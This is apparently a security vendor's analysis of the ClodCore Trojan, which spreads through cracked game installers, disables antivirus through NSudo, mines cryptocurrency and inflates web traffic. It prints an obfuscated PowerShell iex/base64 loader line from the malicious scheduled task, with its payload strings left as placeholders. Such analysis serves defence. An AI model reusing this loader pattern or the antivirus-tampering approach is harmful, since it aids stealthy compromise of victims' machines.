After infecting the Trojan, the virus author will use the cloud control method to deliver mining, dark\nbrushing and other virus modules to use the victim machine to crazy gather money. The victim machines are mainly\ndistributed in Russia, Ukraine and other countries, with cumulative infections exceeding 50,000:\n\nThe execution flow of ClodCore Trojan is as follows:\n\n\n-----\n\nThrough 360 Security Center, we found that the virus spread through various cracked games, the game installation\npackage includes “Grim Facade 8_TheRedCat_CE.exe”, “LostLands_TheWanderer_CE.exe” and so on. After the infected\ninstallation package is run, a scheduled task called “UPnPHost” will be created:\n\nThe scheduled task uses powershell to request the subsequent profit module:\n\npowershell.exe” -c “$ddd = ‘{encryptString1}’;iex(‘$’+’d=”{encryptString2}”;for($z=2;$z–;){$’+’d=\n\n[Syst’+’em.Te’+’xt.Enco’+’ding]::U’+’TF’+4*2+’.Get’+’Str’+’ing([Sys’+’tem.Conv’+’ert]::From’+’Base6’+’4String($d))}$’+’d|i’+’ex;’)\n\nThe content after deobfuscation is as follows:\n\n\n-----\n\n**Destroy anti-virus software**\n\nClodCore will download different virus modules according to the type of anti-virus software installed in the system to\ndestroy the function of the corresponding anti-virus software:\n\nNSudo is a super command line tool developed by M2Team, which can run system programs with higher authority.\nAttackers use NSudo’s high authority to tamper with the core configuration of antivirus software, thereby destroying the\nanti-software function:\n\n\n-----\n\n**Mining**\n\nxm.exe is a 7z format self-extracting file\n\ndlchosts.exe is the main control program, which will decrypt the XMRig5.5.1 mining program and start mining:\n\nThe decryption logic is as follows:\n\n**Brush Traffic**\n\nWASPACE is an application that adds traffic to a website. Users only need to install the configured client on different\nmachines, and the client will brush website traffic for the user:\n\n\n-----\n\nEach machine can be controlled and perform different tasks, including the execution of arbitrary scripts, etc .:\n\nwa.exe is also a 7z format self-extracting file, and the packaged content is WASPACE:\n\n\n-----\n\nThe WASPACE version carried is 3.12.5.4:\n\n\n-----\n\nIn config.json, the user name of the hacker is benzinum789 .\n\nDuring the analysis, we found that the ClodCore Trojan family actually became active as early as 2016. Virus authors have\nbeen constantly fighting against antivirus software through flexible operation and control methods, and continue to update\nprofitable modules, using users’ computer resources to make money.\n\n360 Total Security supports the killing of popular Trojan viruses such as ClodCore. we recommend infected users to install\nand use:\n\n[Learn more about 360 Total Security](https://www.360totalsecurity.com/en/)\n\n\n-----",
